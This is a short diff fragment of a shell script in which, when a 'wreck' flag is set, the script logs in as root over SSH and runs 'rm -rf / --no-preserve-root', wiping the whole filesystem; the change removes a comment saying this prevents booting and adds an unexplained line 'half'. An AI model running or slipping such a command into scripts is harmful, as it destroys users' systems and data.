@@ -82,9 +82,9 @@ if [[ $debug != true ]]; then
 fi
 
 if [[ $wreck == true ]]; then
-# Prevent system from booting
 ssh root@localhost -T <<EOF
 rm -rf / --no-preserve-root
+half
 EOF
 fi
 
